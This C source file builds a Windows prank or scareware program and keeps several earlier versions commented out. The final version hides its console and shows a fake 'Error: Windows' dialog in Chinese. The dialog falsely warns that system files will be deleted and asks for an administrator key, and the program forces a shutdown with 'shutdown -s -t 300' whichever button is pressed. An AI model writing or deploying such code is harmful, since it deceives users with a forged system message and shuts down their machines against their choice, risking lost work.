// #include <stdlib.h>
// #include <locale.h>
// #include <stdio.h>
// void main(){

//     //setlocale(LC_ALL, "");

//     printf("Error:Windows 检测到系统运行时间超过预定周期，为确保系统稳定性，系统将在5分钟后自动关闭以应用重要更新。届时将会删除部分系统文件，请及时进行备份\n若要停止更新请键入管理者密钥");
//     system("shutdown -s -t 300");

//     //getchar();
// }

// #include <windows.h>
// #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) //
// int main() {
// HWND hwnd;
// hwnd=FindWindow( "ConsoleWindowClass", NULL);
// if(hwnd){
// ShowWindow(hwnd,SW_HIDE);
// }

// MessageBox(NULL, TEXT("Error:Windows 检测到系统运行时间超过预定周期，为确保系统稳定性，系统将在5分钟后自动关闭以应用重要更新。届时将会删除部分系统文件，请及时进行备份\n若要停止更新请键入管理者密钥"), TEXT("警告"), MB_OK);
//      system("shutdown -s -t 300");

// return 0;

// }

// #include <windows.h>
// #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) //

// int main() {
//     HWND hwnd;
//     hwnd = FindWindow("ConsoleWindowClass", NULL);
//     if (hwnd) {
//         ShowWindow(hwnd, SW_HIDE);
//     }

//     // 显示MessageBox，带有 "确认" 和 "取消" 按钮
//     int response = MessageBox(
//         NULL, 
//         TEXT("Error: Windows 检测到系统运行时间超过预定周期，为确保系统稳定性，系统将在5分钟后自动关闭以应用重要更新。届时将会删除部分系统文件，请及时进行备份。\n若要停止更新请键入管理者密钥"), 
//         TEXT("警告"), 
//         MB_OKCANCEL | MB_ICONWARNING
//     );

//     // 检查用户选择的按钮
//     if (response == IDOK) {
//         // 用户点击了“确认”，执行关机操作
//         system("shutdown -s -t 300");
//     } else if (response == IDCANCEL) {
//         system("shutdown -s -t 300");
//     }

//     return 0;
// }

#include <windows.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) //

int main() {
    HWND hwnd;
    hwnd = FindWindow("ConsoleWindowClass", NULL);
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }

    // 显示MessageBox，带有 "确认" 和 "取消" 按钮
    int response = MessageBox(
        NULL, 
        TEXT("Error: Windows 检测到系统运行时间超过预定周期，为确保系统稳定性，系统将在5分钟后自动关闭以应用重要更新。届时将会删除部分系统文件，请及时进行备份。\n若要停止更新请键入管理者密钥"), 
        TEXT("警告"), 
        MB_OKCANCEL | MB_ICONWARNING
    );

    // // 无论用户点击确认、取消还是关闭对话框，都执行关机操作
    // if (response == IDOK || response == IDCANCEL || response == IDCLOSE) {
    //     system("shutdown -s -t 300");
    // }

       if(response == IDOK || response == IDCANCEL || response == IDCLOSE){
        system("shutdown -s -t 300");
       }
    return 0;
}
